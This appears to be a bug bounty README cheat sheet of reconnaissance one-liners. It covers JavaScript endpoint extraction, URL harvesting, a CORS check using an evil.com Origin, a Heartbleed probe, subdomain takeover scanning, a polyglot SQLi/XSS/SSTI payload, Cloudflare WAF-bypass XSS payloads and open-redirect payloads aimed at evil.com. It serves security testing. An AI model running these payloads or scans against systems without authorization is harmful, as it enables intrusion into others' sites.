# BugBounty Resources

## Introduction


I always have to search for commands everytime I start to hunt for bugs.Therefore, I created this repository to list all useful commands of different tools. My intention is to make a repository containing all the important commands, technique and oneliners helpful for reconnaissance. 

If you think any important commands were not listed in this repository, feel free to contribute. 

## Extracting endpoints from JavaScript files:
	cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u

## Extracting Juicy Information:
    for sub in $(cat domains.txt);do /usr/bin/gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq |egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a file.txt  ;done

## Extracting all the urls from sitemap
	curl -s domain.com/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'

## CORS Misconfiguration:
    site="https://example.com"; gau "$site" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done

## Heartbleed vulnerability
    cat domains.txt
        example.com
        subdomain.example.com
    cat list.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line: safe; done
  
 ## Finding subdomains and check for takeovers 
      subfinder -d {target} >> domains ; assetfinder -subs-only {target} >> domains ; amass enum -norecursive -noalts -d {target} >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/fingerprints.json -v 3 >> takeover ;
    
  ## Testing SQLi + XSS + SSTI with the same payload use
  	"><svg/onload=prompt(5);>{{7*7}}
  
  ##  XSS Cloudflare WAF bypass: 
  	<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
	<select><noembed></select><script x=’a@b’a>y=’a@b’//a@b%0a\u0061lert(1)</script x>
	<a+HREF=’%26%237javascrip%26%239t:alert%26lpar;document.domain)’>
	
  ## Valid URLs (Open Redirect Vulnerability)
	http(s)://evil.com
	http(s):\\evil.com
	//evil.com
	///evil.com
	/\/evil.com
	\/evil.com
	\\evil.com
	\/\evil.com
	/	/evil.com (That's a Tab Key / ASCII 0x09)
	\	\evil.com (That's a Tab Key / ASCII 0x09)

#### Refrences:
  - https://github.com/dwisiswant0/awesome-oneliner-bugbounty
  - https://github.com/XalfiE/Bug-Bounty-Oneliners
  - https://bbinfosec.medium.com/collection-of-bug-bounty-tip-will-be-updated-daily-605911cfa248
  
